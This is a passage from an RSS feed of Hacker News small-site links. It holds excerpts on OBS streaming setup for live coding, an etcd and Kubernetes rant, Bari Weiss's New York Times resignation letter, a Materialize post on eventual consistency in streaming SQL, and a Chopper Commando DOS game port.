<a href="#obs-configuration">section</a> about
<a href="https://obsproject.com/">OBS</a>, which is the awesome, cross-platform, free and
open source streaming software that most of the community uses. OBS will be
your best friend on your streaming journey! You will use it to control your
webcam, desktop, audio, and every other element that goes into the final
product of your livestream.</p>
<p>The rest of the post focuses on configuration that’s more specific to Twitch.
I like to use Twitch because I like the culture that’s developed there over
time, but plenty of people think that YouTube Live is more appropriate for
professional content. I’m not too familiar with YouTube Live, but most of the
discussion about OBS should apply the same for YouTube as it does for Twitch:
the main difference is that you’ll configure OBS to send to your YouTube
account instead of Twitch in Stream settings.</p>
<blockquote>
<p><strong><em>Yo!</em> If you’re trying to set up your very first stream</strong>, you really
don’t need most of the stuff in this guide, which represents what I’ve built
gradually over the past 6 months, stream by stream. My recommendation for the
livecoding-curious is to try streaming with a bare-bones setup, to see how
you like it, before investing in expensive gear or diving into hours of
configuration and asset creation. You can accomplish this in several hours
over a weekend. Set up a single scene in OBS with your captured desktop as
the background and your webcam in the corner, with your microphone configured
under Mic/Aux. That’s all you need: a simple setup for streaming your coding
is now yours! I’ll cover how to make that happen below, in the OBS
Configuration section. Just ignore most of the extra scenes and various bells
and whistles, and you’ll be good to go.</p>
</blockquote>

<p><a href="https://obsproject.com/">OBS</a> is where you’ll produce everything that your
viewers can see and hear on the live video, including your desktop, the camera
with your beautiful face on it, your voice, and any stream alerts, overlays,
text, or other information that you might want to show to your viewers.</p>
<p><img src="https://jordanlewis.org/images/stream/desktop2.png" alt="Desktop"></p>
<p>There’s a lot to cover with OBS and I’m not going to try to explain all of it,
so I’ll just talk about what’s worked for me. To make something that suits you,
you’ll need to flex your creative muscles! You can use the ideas here as a
starting place, but you’ll need to dive into OBS and play around: everyone’s
setup is going to be different.</p>
<h2 id="scenes">Scenes <a href="#scenes" arialabel="Anchor"><i data-feather="link-2"></i></a> </h2>
<p>A <em>scene</em> is OBS’s name for a particular layout of video and audio components
on a stream. Typically, you’ll see Twitch streamers stay on a single scene for
most of their stream: their game, desktop, or whatever their focus is. But it’s
handy to have a few extra ones for the intro and outro to your stream,
something that covers the screen for when you want to take a break, and so on.</p>
<p><img src="https://jordanlewis.org/images/stream/scenes.png" alt="Scenes popped out"></p>
<p>I have the main scenes that I use bound to global hotkeys, so I can switch
between them without having to click around in OBS. Unfortunately, sometimes
the hotkeys stop working during the stream - I’ve yet to figure out exactly why
this happens. If you happen to have this same problem and have found a
workaround, please let me know!</p>
<p>I have 6 primary scenes, and a couple of child scenes that are embedded in
several main scenes to deduplicate on-screen elements (the ones below the
<code>-----</code> in the picture). However, I spend the vast majority of my stream on one
of them: the Desktop scene.</p>
<h3 id="desktop">Desktop <a href="#desktop" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>This scene is the workhorse of the stream, and the one that’s active 95% of the
time. It consists of a full-screen, 1080p Display Capture source of my external
monitor. This is convenient because it leaves no ambiguity about what’s catpured
on the stream (it’s the whole monitor) and leaves my laptop screen free for
the OBS window, monitoring chat, and anything else that I want to look at while
streaming without having to show my viewers.</p>
<p>My <a href="https://jordanlewis.org/posts/desk-setup-2020">Desktop setup post</a> goes into more detail about the
way that I’ve set up my desk to have two monitors. It’s so convenient for the
stream that I’m hooked, and I’m not sure how I’d manage without.</p>
<p><img src="https://jordanlewis.org/images/stream/desktopscene.png" alt="Desktop Scene in OBS"></p>
<blockquote>
<p>A quick note on font size: you have to make your text editor font quite large
to make it legible for your viewers! It will take a little while to get used
to this. I use 26-point font in my editor, which provides only about 30
visible horizontal lines of code. This is next to nothing compared to the
amount of context you’re probably used to seeing while programming. This
hamstringing is worth it, though: the bigger your font, the more likely it is
that your viewers will be able to follow along with what you’re doing, stay
engaged, ask questions, learn, and have fun.</p>
<p>You should also try to remove as many distracting elements from your editor
and desktop as possible while streaming, to keep the focus on the code. For
me, this has meant disabling the Mac’s menubar and Dock, and removing the
vast majority of toolbars from my IDE.</p>
</blockquote>
<p>Besides the desktop capture source, which is at the back of the scene, I’ve
added several other sources:</p>
<ol>
<li>Face cam, which is a video source from my capture card (more information about the video sources in the <a href="#video">Video</a> section)</li>
<li>Keyboard cam, which is a video source from a webcam pointed at my keyboard.</li>
<li>A couple of text boxes, to show my most recent subscriber, follower, and
some on-stream commands. The text boxes are updated automatically by the
<a href="https://streamlabs.com/dashboard#/streamlabels">StreamLabels</a> app.</li>
<li>A web page source connected to Streamlabs Stream Alerts, which I’ll cover <a href="#stream-alerts">below</a>.</li>
</ol>
<p>I definitely didn’t start with all of these elements - it’s quite a lot of work
to tweak things just the way you want - but I’ve kept this configuration for the
past couple of months and I like the way it looks.</p>
<h3 id="whiteboard">Whiteboard <a href="#whiteboard" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>The whiteboard scene is meant to showcase my iPad full screen, allowing me to
draw things on stream to demonstrate ideas or concepts. I use the Concepts app
on the iPad along with an Apple Pencil for drawing, and it works pretty nicely.</p>
<p><img src="https://jordanlewis.org/images/stream/whiteboard.png" alt="Whiteboard scene"></p>
<p>I didn’t know how to fill up the space on the bottom left, since the iPad
doesn’t have a widescreen aspect ratio like my monitor does, so I put a picture
that my friend Aileen drew of me to make the stream a bit more visually
interesting!</p>
<p>This scene references the same facecam and alerts source as the Desktop scene.
You can definitely use DRY principles in OBS, just like software - but it does
get tricky to keep everything de-duplicated.</p>
<h3 id="ipad-green-screen-overlay">iPad Green Screen Overlay <a href="#ipad-green-screen-overlay" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>I also set up a “green screen” configuration for the iPad that I can overlay
over any other scene with a global hotkey. This gives me the ESPN football
announcer effect during my stream: I can draw on my iPad, and the lines will
appear overlayed on top of whatever else I have on stream at the time.</p>
<p>This is probably the most complex video element on my
stream, but OBS makes it pretty simple to set up. I added a Color Key filter
with a black background on top of the raw iPad video feed, set my drawing app
to have a black background, and tweaked the Color Key settings in OBS until
things looked right:</p>
<p><img src="https://jordanlewis.org/images/stream/colorkey.png" alt="iPad Color Key"></p>
<p>I don’t use this element as nearly as often as I’d like, but I think it’s
pretty neat. I recorded a <a href="https://www.youtube.com/watch?v=U4WJQmN1cSo">demo
video</a> of it if you’re curious for
how it looks - I also use it occasionally on the stream.</p>
<h3 id="selfie">Selfie <a href="#selfie" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>This is just a full-screen version of the facecam. I copied the name of the
scene from <a href="https://medium.com/@suzhinton/my-twitch-live-coding-setup-b2516672fb21">@noopkat’s
blog</a>.</p>
<p><img src="https://jordanlewis.org/images/stream/selfie.png" alt="Selfie scene"></p>
<p>I use this scene for “turn to the camera” moments, which I find really fun. I’ll
switch to the scene, look right at the camera, and talk for a bit before
switching back to the desktop view.</p>
<h3 id="starting-soon">Starting Soon <a href="#starting-soon" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>This scene goes on as soon as the stream turns on, until I’m ready to start
talking to the camera. I’ll usually start the stream a few minutes before the
time that I announced on Twitter for my stream, and leave it up until that time
comes (with a muted mic!).</p>
<p><img src="https://jordanlewis.org/images/stream/startingsoon.png" alt="Starting Soon scene"></p>
<p>I used a gif I found on the internet of someone typing, so people can tell that
the stream is live even though there’s nothing happening yet. There’s also music
during this “pre-roll”. I’ll talk about music and sound <a href="#audio">later</a>).</p>
<h3 id="brb">BRB <a href="#brb" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>I’ll put this scene on if I need to step away from the stream for a moment to
use the bathroom or whatever. I added a sound to …</p></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jordanlewis.org/posts/twitch-live-coding/">https://jordanlewis.org/posts/twitch-live-coding/</a></em></p>]]>
            </description>
            <link>https://jordanlewis.org/posts/twitch-live-coding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23834153</guid>
            <pubDate>Tue, 14 Jul 2020 16:38:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Etcd, or, why modern software makes me sad]]>
            </title>
            <description>
<![CDATA[
Score 1161 | Comments 578 (<a href="https://news.ycombinator.com/item?id=23833362">thread link</a>) | @Spellman
<br/>
July 14, 2020 | https://www.roguelazer.com/2020/07/etcd-or-why-modern-software-makes-me-sad/ | <a href="https://web.archive.org/web/*/https://www.roguelazer.com/2020/07/etcd-or-why-modern-software-makes-me-sad/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <section id="main-content" role="main">
	<article>
		


		<div><p><img alt="etcd icon" src="https://www.roguelazer.com/images/etcd-icon.png"></p>
<p>Once upon a time in 2013, there was a tool called <a href="https://etcd.io/">etcd</a> which was a really lightweight database written
around the <a href="https://web.stanford.edu/~ouster/cgi-bin/papers/raft-atc14">Raft</a> consensus algorithm. This tool was
originally written in 2013 for a <del>bullshit</del> unsuccessful project called <a href="https://coreos.com/os/docs/latest/">CoreOS Container Linux</a> that was
EOL'd several years ago, but that doesn't really matter — etcd was greater than its original use-case. Etcd
provided a convenient and simple set of primitives (set a key, get a key, set-only-if-unchanged, watch-for-changes) with
a drop-dead simple HTTP API on top of them. I have built a number of tools using etcd as a lightweight consensus store
behind them and it's absolutely a pleasure to work with.</p>
<div>
<p>Hello <strong>massive influx of new readers</strong>! I see that some <del>person who's out to get me</del> kind soul has
cross-posted this to Hacker News, Reddit, and a bunch of other sites. Cool! A few things you might want to know <em>before</em>
you send me hate-mail:</p>
<ul>
<li>The word "rant" is right up there in the tags line. This is not meant to be a persuasive argument to the secret cabal
  that controls API design or a nuanced technical comparison article. It's just some off-the-cuff thoughts. Chillax.</li>
<li>If this didn't come across clearly enough in the article: <em>I think etcd is great!</em> I have written a bunch of tools and
  applications on top of it! I think it's a fantastic little dæmon and its API, even the new janky v3 API, is still a
  million times better than ZooKeeper</li>
</ul>
<p>Okay, then. Read on.</p>
</div>
<p>In 2015, an unrelated tool called <a href="https://github.com/kubernetes/kubernetes">Kubernetes</a> was released by Google (but, really, by
Xooglers). I would go so far as to say that Kubernetes (or, as the "cool kids" say, <kbd>k8s</kbd>) is the worst thing to happen to system administration
since <a href="https://www.roguelazer.com/2020/03/systemd/">systemd</a>. It's a comprehensive suite that promises to simplify operating clusters of software and give something like 
the experience of Google's <kbd>borg</kbd> cluster manager. What it really does is:</p>
<ol>
<li>Add hundreds of new failure modes to your software</li>
<li>Move you from writing portable software configuration to writing thousands of lines of k8s-specific YAML</li>
<li>Ensnare you in a mesh of questionably-good<sup id="fnref:questionably-good"><a href="#fn:questionably-good">1</a></sup> patterns like containerization and software defined networking</li>
</ol>
<p>If you are running a truly enormous system and want to have off-the-shelf orchestration for it, Kubernetes may be
the tool for you. For 99.9% of people out there, it's just an extra layer of complexity that adds almost nothing of
value.</p>
<p>I digress, though; this is a story about etcd. And, unfortunately, our stories come together because Kubernetes was
quickly changed to use etcd as its state store. Thus began the rapid decline of etcd.</p>
<p>With the massive influx of Kubernetes users came, of course, a large number of Xooglers who decided to infect etcd with
Google technologies, as is their way<sup id="fnref:infection"><a href="#fn:infection">2</a></sup><sup id="fnref:who"><a href="#fn:who">3</a></sup>. Etcd's simple HTTP API was replaced by a "gRPC"<sup id="fnref:grpc"><a href="#fn:grpc">4</a></sup> version; the
simple internal data model was replaced by a dense and non-orthogonal data model with different types for leases, locks,
transactions, and plain-old-keys. etcd 3.2 added back a tiny subset of the HTTP API through the <a href="https://etcd.io/docs/v3.4.0/dev-guide/api_grpc_gateway/">"gRPC
Gateway"</a>, but not enough to implement
any of the rich applications built on top of the original API. The v2 API lives on for now, but upstream threatens to
remove it in every new version and there will surely come a time when it'll be removed entirely.</p>
<p>That's it. That's the story. Popular modern technology is taken over by expats from a megacorp and made worse in the
service of a hyper-specialized (and just plain over-hyped) orchestration platform. That's the world today. Anything that
has a simple and elegant feature-set ends up coöpted by people who just want to build big ungainly architecture and ends
up inheriting features from whatever megacorp the coöpters came from<sup id="fnref:megacorp"><a href="#fn:megacorp">9</a></sup>. The software development world would
prefer to use their multi-gigabyte IDEs running on ElectronJS to build thousand-dependency Java applications targeting
ungainly APIs on hard-to-operate systems than support something simpler and better. Quality is, alas, a dying art.</p>
</div>
<hr>
<h2>Comments</h2>


	</article>
    </section>
</div></div>]]>
            </description>
            <link>https://www.roguelazer.com/2020/07/etcd-or-why-modern-software-makes-me-sad/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23833362</guid>
            <pubDate>Tue, 14 Jul 2020 15:51:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Resignation Letter]]>
            </title>
            <description>
<![CDATA[
Score 601 | Comments 614 (<a href="https://news.ycombinator.com/item?id=23833267">thread link</a>) | @kirillzubovsky
<br/>
July 14, 2020 | https://www.bariweiss.com/resignation-letter | <a href="https://web.archive.org/web/*/https://www.bariweiss.com/resignation-letter">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-5f0dca0caa6bc4150907a76b"><div><p>Dear A.G.,</p><p>It is with sadness that I write to tell you that I am resigning from The New York Times.&nbsp;</p><p>I joined the paper with gratitude and optimism three years ago. I was hired with the goal of bringing in voices that would not otherwise appear in your pages: first-time writers, centrists, conservatives and others who would not naturally think of The Times as their home. The reason for this effort was clear: The paper’s failure to anticipate the outcome of the 2016 election meant that it didn’t have a firm grasp of the country it covers. Dean Baquet and others have admitted as much on various occasions. The priority in Opinion was to help redress that critical shortcoming.</p><p>I was honored to be part of that effort, led by James Bennet. I am proud of my work as a writer and as an editor. Among those I helped bring to our pages: the Venezuelan dissident Wuilly Arteaga; the Iranian chess champion Dorsa Derakhshani; and the Hong Kong Christian democrat Derek Lam. Also: Ayaan Hirsi Ali, Masih Alinejad, Zaina Arafat, Elna Baker, Rachael Denhollander, Matti Friedman, Nick Gillespie, Heather Heying, Randall Kennedy, Julius Krein, Monica Lewinsky, Glenn Loury, Jesse Singal, Ali Soufan, Chloe Valdary, Thomas Chatterton Williams, Wesley Yang, and many others.</p><p>But the lessons that ought to have followed the election—lessons about the importance of understanding other Americans, the necessity of resisting tribalism, and the centrality of the free exchange of ideas to a democratic society—have not been learned. Instead, a new consensus has emerged in the press, but perhaps especially at this paper: that truth isn’t a process of collective discovery, but an orthodoxy already known to an enlightened few whose job is to inform everyone else.</p><p>Twitter is not on the masthead of The New York Times. But Twitter has become its ultimate editor. As the ethics and mores of that platform have become those of the paper, the paper itself has increasingly become a kind of performance space. Stories are chosen and told in a way to satisfy the narrowest of audiences, rather than to allow a curious public to read about the world and then draw their own conclusions.<strong> </strong>I was always taught that journalists were charged with writing the first rough draft of history. Now, history itself is one more ephemeral thing molded to fit the needs of a predetermined narrative.</p><p>My own forays into Wrongthink have made me the subject of constant bullying by colleagues who disagree with my views. They have called me a Nazi and a racist; I have learned to brush off comments about how I’m “writing about the Jews again.” Several colleagues perceived to be friendly with me were badgered by coworkers. My work and my character are openly demeaned on company-wide Slack channels where masthead editors regularly weigh in. There, some coworkers insist I need to be rooted out if this company is to be a truly “inclusive” one, while others post ax emojis next to my name. Still other New York Times employees publicly smear me as a liar and a bigot on Twitter with no fear that harassing me will be met with appropriate action. They never are.</p><p>There are terms for all of this: unlawful discrimination, hostile work environment, and constructive discharge. I’m no legal expert. But I know that this is wrong.&nbsp;</p><p>I do not understand how you have allowed this kind of behavior to go on inside your company in full view of the paper’s entire staff and the public. And I certainly can’t square how you and other Times leaders have stood by while simultaneously praising me in private for my courage. Showing up for work as a centrist at an American newspaper should not require bravery.</p><p>Part of me wishes I could say that my experience was unique. But the truth is that intellectual curiosity—let alone risk-taking—is now a liability at The Times. Why edit something challenging to our readers, or write something bold only to go through the numbing process of making it ideologically kosher, when we can assure ourselves of job security (and clicks) by publishing our 4000th op-ed arguing that Donald Trump is a unique danger to the country and the world? And so self-censorship has become the norm.</p><p>What rules that remain at The Times are applied with extreme selectivity. If a person’s ideology is in keeping with the new orthodoxy, they and their work remain unscrutinized. Everyone else lives in fear of the digital thunderdome. Online venom is excused so long as it is directed at the proper targets.&nbsp;</p><p>Op-eds that would have easily been published just two years ago would now get an editor or a writer in serious trouble, if not fired. If a piece is perceived as likely to inspire backlash internally or on social media, the editor or writer avoids pitching it. If she feels strongly enough to suggest it, she is quickly steered to safer ground. And if, every now and then, she succeeds in getting a piece published that does not explicitly promote progressive causes, it happens only after every line is carefully massaged, negotiated and caveated.</p><p>It took the paper two days and two jobs to say that the Tom Cotton op-ed “fell short of our standards.” We attached an editor’s note on a travel story about Jaffa shortly after it was published because it “failed to touch on important aspects of Jaffa’s makeup and its history.” But there is still none appended to Cheryl Strayed’s fawning interview with the writer Alice Walker, a proud anti-Semite who believes in lizard Illuminati.&nbsp;</p><p>The paper of record is, more and more, the record of those living in a distant galaxy, one whose concerns are profoundly removed from the lives of most people. This is a galaxy in which, to choose just a few recent examples, the Soviet space program is lauded for its “diversity”; the doxxing of teenagers in the name of justice is condoned; and the worst caste systems in human history includes the United States alongside Nazi Germany.</p><p>Even now, I am confident that most people at The Times do not hold these views. Yet they are cowed by those who do. Why? Perhaps because they believe the ultimate goal is righteous. Perhaps because they believe that they will be granted protection if they nod along as the coin of our realm—language—is degraded in service to an ever-shifting laundry list of right causes. Perhaps because there are millions of unemployed people in this country and they feel lucky to have a job in a contracting industry.&nbsp;</p><p>Or perhaps it is because they know that, nowadays, standing up for principle at the paper does not win plaudits. It puts a target on your back. Too wise to post on Slack, they write to me privately about the “new McCarthyism” that has taken root at the paper of record.</p><p>All this bodes ill, especially for independent-minded young writers and editors paying close attention to what they’ll have to do to advance in their careers. Rule One: Speak your mind at your own peril. Rule Two: Never risk commissioning a story that goes against the narrative. Rule Three: Never believe an editor or publisher who urges you to go against the grain. Eventually, the publisher will cave to the mob, the editor will get fired or reassigned, and you’ll be hung out to dry.</p><p>For these young writers and editors, there is one consolation. As places like The Times and other once-great journalistic institutions betray their standards and lose sight of their principles, Americans still hunger for news that is accurate, opinions that are vital, and debate that is sincere. I hear from these people every day. “An independent press is not a liberal ideal or a progressive ideal or a democratic ideal. It’s an American ideal,” you said a few years ago. I couldn’t agree more. America is a great country that deserves a great newspaper.&nbsp;</p><p>None of this means that some of the most talented journalists in the world don’t still labor for this newspaper. They do, which is what makes the illiberal environment especially heartbreaking. I will be, as ever, a dedicated reader of their work. But I can no longer do the work that you brought me here to do—the work that Adolph Ochs described in that famous 1896 statement: “to make of the columns of The New York Times a forum for the consideration of all questions of public importance, and to that end to invite intelligent discussion from all shades of opinion.”</p><p>Ochs’s idea is one of the best I’ve encountered. And I’ve always comforted myself with the notion that the best ideas win out. But ideas cannot win on their own. They need a voice. They need a hearing. Above all, they must be backed by people willing to live by them.&nbsp;</p><p>Sincerely,</p><p>Bari </p></div></div></div></div>]]>
            </description>
            <link>https://www.bariweiss.com/resignation-letter</link>
            <guid isPermaLink="false">hacker-news-small-sites-23833267</guid>
            <pubDate>Tue, 14 Jul 2020 15:43:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Eventual Consistency isn’t for Streaming]]>
            </title>
            <description>
<![CDATA[
Score 162 | Comments 45 (<a href="https://news.ycombinator.com/item?id=23832149">thread link</a>) | @arjunnarayan
<br/>
July 14, 2020 | https://materialize.io/eventual-consistency-isnt-for-streaming/ | <a href="https://web.archive.org/web/*/https://materialize.io/eventual-consistency-isnt-for-streaming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Streaming systems consume inputs and produce outputs asyncronously: the output of a system at any moment may not reflect all of the inputs seen so far. These systems provide various guarantees about how their outputs relate to their input. Among the weaker (but not unpopular) guarantees is <a href="https://en.wikipedia.org/wiki/Eventual_consistency">eventual consistency</a>. Informally, eventual consistency means if the input stops changing, the output will eventually arrive at the correct result.</p>
<p>In this post we’ll see that for as long as its input streams haven’t been stopped, natural eventually consistent computations can produce <em>unboundedly large and systematic errors</em>. If you are doing even slightly non-trivial computations, you should be prepared for your results to be <em>never-consistent</em> (a much less popular consistency definition). Until you pause the input streams and await correct answers, at least.</p>
<p>Not all is lost! There are stream processing systems that provide strong consistency guarantees. <a href="https://materialize.io/">Materialize</a> and <a href="https://github.com/TimelyDataflow/differential-dataflow">Differential Dataflow</a> both avoid these classes of errors by providing <em>always correct</em> answers, as do several other streaming systems.</p>
<p>If you want to avoid systematic and on-going errors in your results, you should probably check if the stream processor you use provides stronger consistency guarantees.</p>
<h2>Background on Eventual Consistency</h2>
<p>To quote from the <a href="https://en.wikipedia.org/wiki/Eventual_consistency">Wikipedia page on eventual consistency</a></p>
<blockquote><p>
  Eventual consistency is a consistency model used in distributed computing to achieve high availability that informally guarantees that, if no new updates are made to a given data item, eventually all accesses to that item will return the last updated value.
</p></blockquote>
<p>Eventual consistency is most often invoked for key-value stores, where each key tracks an independent value and one can reasonably imagine not updating the value associated with a key for long enough that the right answer might shake out. For example, if a database stores a map from people to their addresses, your update to your own address might not be visible immediately, but if you give it a few minutes it will probably sort itself out (if you don’t further update your address).</p>
<p>The requirement is only that folks stop updating a specific key, not that they stop using the database entirely. The rest of the world can keep reading out addresses, even keep reading out your stale address, and an eventually consistent system is obliged to eventually update your address (assuming you don’t keep re-submitting updates). Eventual consistency is a workable definition of consistency for key-value stores, where the vast majority of operations do not conflict, and one can reasonably expect to wait out any inconsistency.</p>
<p>Is eventual consistency a workable definition of consistency for streaming computations?</p>
<h2>Streaming computations</h2>
<p>There are many streaming computations out there. I’m going to focus on a class that lines up well with our study of consistency: incremental view maintenance. Incremental view maintenance is where you’ve defined a view, essentially a name bound to a query, and want to see the output answers change as the input data change.</p>
<p>Let’s say you’ve defined a query that could be applied to a static dataset, something like</p>
<pre title="">-- count the records in `data`
select count(*) from data
</pre>
<p>Now, the underlying <code>data</code> might change. As they do, we should produce the corresponding changes to the output. In this case, we would like to see how the <code>count</code> of the records in <code>data</code> have changed.</p>
<p>There are more complicated queries we might write. For example, this query determines the set of keys whose values are the largest among all keys:</p>
<pre title="">-- select keys with maximum values
select data.key
from data
where data.value in (select max(data.value) from data)
</pre>
<p>As <code>data</code> change, we would like to see the resulting set of keys track the maximum values</p>
<p>This next query determines the standard deviation of values for each key, and then selects out those values that are surprisingly large.</p>
<pre title="">-- determine average and stddev for groups
create view stats_by_key
select
    data.key,
    avg(data.value) as average,
    stddev(data.value) as deviation
from data
group by data.key;

-- select out surprisingly large values
select data.key, data.value
from data, stats_by_key
where
    data.key = stats_by_key.key and
    data.value &gt; average + 3 * devation
</pre>
<p>As <code>data</code> move around, the set of current outliers moves around too, and we would be delighted to be warned of them so that we can take some important action.</p>
<p>I don’t have strong opinions about whether these are exciting queries to compute, but we’ll use them as examples of streaming computations that can go surprisingly wrong. If your computations are more sophisticated than these examples, you might have even more to worry about.</p>
<h2>Eventual consistency in streaming: example 1</h2>
<p>What does a naive application of eventual consistency have to say about</p>
<pre title="">-- count the records in `data`
select count(*) from data
</pre>
<p>It’s not really clear, is it? Even if there were clear keys we are writing to, the thing we want to be correct is an aggregation across all of them rather than the value associated with a specific key. That result depends on all values. We could still extrapolate the definition of eventual consistency out to mean that if the input stops changing entirely, the system will eventually update to the correct count of records in <code>data</code>.</p>
<p>Although you shouldn’t expect to see this in the wild, an eventually consistent streaming system is certainly permitted to delay its processing as long as there are any outstanding input records that haven’t been processed yet.</p>
<p>This is actually not as unreasonable as you might think. Many stream processors intentionally batch up their inputs to improve their efficiency, and get started only once they get a moment of fresh air in their input stream. This technique allows them to improve their throughput during load spikes, by batching and re-ordering updates (for example, bundling all updates to the same key). It would be natural to see updates out of order, but taken to the extreme this technique results is no updates during the load spike.</p>
<p>While this is not necessarily something you’ll see in a professional stream processor, nothing about eventual consistency prevents behavior like this. So, while it’s not the most realistic reason to be worried about eventual consistency, it paints a bit of a picture about what we might need to watch out for.</p>
<p>Let’s ignore the possibility that a technically correct eventually consistent processor could produce no results, and instead look at what happens for more reasonable systems on continually changing input streams.</p>
<h2>Eventual consistency in streaming: example 2</h2>
<p>Let’s take the query that selects out the keys with maximum values:</p>
<pre title="">-- select keys with maximum values
select data.key
from data
where data.value in (select max(data.value) from data)
</pre>
<p>This is how you express “argmax” in SQL, and it is roughly equivalent to a join between the collections <code>data</code> and <code>select max(data.value) from data</code>.</p>
<p>A reasonable person might expect to see the keys with maximum values here, and have an eventually consistent system eventually show it some maximal keys. Some head scratching and you might walk that back to “any keys at all” because they might no longer be maximal at the moment you see them. But <em>eventually</em> we should see <em>some</em> keys, right?</p>
<p>Nope.</p>
<p>At least, not as long as the input stream is allowed to change.</p>
<p>Imagine the join between <code>data</code> and <code>select max(data.value) from data</code> receives its eventually consistent inputs consistently later for <code>data</code> than for <code>select max(data.value) from data</code>. This is not unreasonable, as it can be easier to maintain a <code>max</code> than to maintain an entire collection (<code>data</code>). As each record of <code>data</code> arrives, even those records with maximal values at the time of their submission may find that the maximum has advanced before they got there. They no longer match the maximum value, and are not produced as output.</p>
<p>Let’s demonstrate this in <a href="https://github.com/TimelyDataflow/differential-dataflow">Differential Dataflow</a>. We’ll have to fake some things out, because its consistency guarantees are unfortunately too strong. Fortunately, we can directly program transient delays in to the dataflow.</p>
<p>Imagine a collection that may have multiple keys in it, but we’ll only need one. We’ll increment the value associated with the key regularly (perhaps this is bandwidth used, or money spent, or most recent access, or …). Importantly, we’ll delay the update along one path by the gap in time between updates.</p>
<pre title="">// Global aggregation of values, on-time.
let input1 =
data.map(|(key,val)| ((),val))
    .max_by_key() // not real; should be `reduce(...)`.
    .map(|((), val)| (val, ()));

// Delayed map from values back to their keys.
let input2 =
data.delay(|t| t + 1)
    .map(|(key,val)| (val,key));

// Observe any results
input2.semijoin(&amp;input)
      .inspect(|x| println!("KEY: {:?}", x));
</pre>
<p>We’ll feed in changes that add elements to <code>data</code>, one at a time. Roughly like so</p>
<pre title="">(key, 1000)
(key, 2000)
(key, 3000)
...
</pre>
<p>The keys and values aren’t important, other than that the maximum increases. If the maximum increases within the time of the delay associated with the “eventual” nature of the consistency, we see no results:</p>
<pre title="">    Finished dev [unoptimized + debuginfo] target(s) in 0.04s
     Running `target/debug/examples/eventual`
Round 0 complete
Round 1 complete
Round 2 complete
Round 3 complete
Round 4 complete
Round 5 complete
...
</pre>
<p>Suffice it to say we didn’t see any <code>KEY</code> reports. We would, eventually, if we were to stall the input stream and allow one of the inputs to the join to catch up to the other.</p>
<p>What happens if we <code>delay</code> the <code>max</code> computation instead of the <code>data</code> stream? If the updates overwrite their previous values (<em>i.e.</em> if <code>(key, 2000)</code> overwrites <code>(key, 1000)</code>) then we also see no outputs, because by the time the maximum arrives the value has changed.</p>
<p>Eventual consistency is pretty badly suited to problem of aligning data, when the contents of either of those streams of data can be expected to move on. In our case, the maximum is regularly …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://materialize.io/eventual-consistency-isnt-for-streaming/">https://materialize.io/eventual-consistency-isnt-for-streaming/</a></em></p>]]>
            </description>
            <link>https://materialize.io/eventual-consistency-isnt-for-streaming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23832149</guid>
            <pubDate>Tue, 14 Jul 2020 14:11:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chopper Commando Revisited]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 21 (<a href="https://news.ycombinator.com/item?id=23830881">thread link</a>) | @loadzero
<br/>
July 14, 2020 | https://blog.loadzero.com/blog/chopper258/ | <a href="https://web.archive.org/web/*/https://blog.loadzero.com/blog/chopper258/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p><i>This article contains pixel art. For best results please use 100% browser zoom.</i></p>

<p><a href="https://github.com/loadzero/chopper258">chopper258</a> is a port of <a href="https://www.mobygames.com/game/chopper-commando">Chopper Commando</a>, a DOS game written by <a href="https://www.mobygames.com/developer/sheet/view/developerId,59219/">Mark Currie</a> using Turbo Pascal in 1990.</p>

<p>Some thirty years later, in 2020, I've dusted off the old code and breathed some new life into it. I've ported it to C and made it work with SDL2, and it can now run natively in modern environments.</p>

<p>The canvas below shows a minute or so of gameplay from the new version.</p>




<p>The game can also be played on the web, thanks to emscripten.</p>

<p>Let's do a quick check to see if you can play.</p>

<span>
    <p>Yes, you can play the game by <span>clicking</span> on the button below.</p>

    
    
</span>

<span>
    <p>Unfortunately, your browser looks to be incompatible. The game currently only works in Desktop Chrome, due to the use of certain low level features.</p>
</span>



<p>Thanks to Mark Currie for granting me permission to publish this translation of his game.

</p><p>In addition to publishing the <a href="https://github.com/loadzero/chopper258">source code</a>, and
<span><a href="https://blog.loadzero.com/demo/chopper258">playable version</a>,</span>
<span>playable version,</span> I am also writing a series of articles to accompany the
project, the first part of which is included below.</p>

<p>I have also made some animations and interactive parts that you can <span>play</span> around
with, such as the <a href="#picker_link">palette picker</a> later on in this piece.</p>



<h2>Background</h2>

<p>I chose to revisit Chopper Commando for a few reasons.

</p><p>One of the biggest ones is nostalgia. I remember enjoying playing this game
as a child, on my PC and with others, and being surprised at some of the novel
mechanics. I also remember having a good laugh.

</p><p>This is the first game I played where you could leave a
vehicle, run around and do things on foot, and then get back in and keep going.
I thought that was so cool, and it was an early precursor to the sandbox games I
enjoy today.

</p><p>I have a soft spot for bedroom coded efforts like this, where the heart and
soul of the game isn't obscured by many layers of polish. It's not too hard to
imagine a 15-year old Mark Currie writing a game for himself on his 286, and
getting a real kick out of doing so.

</p><p>Games like this were pretty formative for me as a young aspiring games
programmer. Unlike something like Super Mario, which seemed unreachable to me at the time, I could play this and start working out how to make something similar, even with the simple tools I had.

</p><h2>Project Scale</h2>

<p>This was a bit smaller and more straightforward than my previous effort,
<a href="http://blog.loadzero.com/blog/si78c/">Space Invaders In C</a>. This project
took around 3 months of calendar time, and about 200 hours were spent on it in total.

